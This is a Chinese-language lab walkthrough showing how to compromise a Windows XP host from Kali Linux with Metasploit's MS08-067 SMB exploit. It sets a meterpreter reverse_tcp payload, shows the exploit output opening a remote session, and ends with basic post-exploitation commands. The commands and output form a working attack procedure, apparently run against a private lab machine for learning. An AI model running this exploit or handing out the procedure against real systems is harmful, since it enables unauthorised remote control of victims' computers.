## Kali攻擊XP

<service postgresql start>先導入攻擊資料庫

<msfconsole>開啟攻擊面板
  
<use windows/smb/ms08_067_netapi>使用的漏洞

<show options>檢查設定
  
               Name     Current Setting  Required  Description
               ----     ---------------  --------  -----------
               RHOSTS                    yes       The target address range or CIDR identifier
               RPORT    445              yes       The SMB service port (TCP)
               SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

<set RHOSTS 10.0.2.5>設定欲攻擊的IP

<check>檢查是否有導入
 
<set payload windows/meterpreter/reverse_tcp>

<show options>再次檢查
  
               Module options (exploit/windows/smb/ms08_067_netapi):

                 Name     Current Setting  Required  Description
                 ----     ---------------  --------  -----------
                 RHOSTS   10.0.2.5         yes       The target address range or CIDR identifier
                 RPORT    445              yes       The SMB service port (TCP)
                 SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


              Payload options (windows/meterpreter/reverse_tcp):

                 Name      Current Setting  Required  Description
                 ----      ---------------  --------  -----------
                 EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
                 LHOST                      yes       The listen address (an interface may be specified)
                 LPORT     4444             yes       The listen port


              Exploit target:

                 Id  Name
                 --  ----
                 0   Automatic Targeting

<set LHOST attact ip>設定攻擊者ip
  
<exploit>攻擊開始

                [*] Started reverse TCP handler on 10.0.2.4:4444 
                [*] 10.0.2.5:445 - Automatically detecting the target...
                [*] 10.0.2.5:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Chinese - Traditional / Taiwan
                [*] 10.0.2.5:445 - Selected Target: Windows XP SP3 Chinese - Traditional / Taiwan (NX)
                [*] 10.0.2.5:445 - Attempting to trigger the vulnerability...
                [*] Sending stage (179779 bytes) to 10.0.2.5
                [*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.5:1045) at 2020-10-19 11:01:38 -0400
                
## 此時以攻擊成功可控制XP                
                
<pwd>Linux指令檢查正在的目錄
                
                meterpreter > pwd
                C:\WINDOWS\system32
                
<cd /> 前往根目錄

<mkdir 檔名>創建資料夾
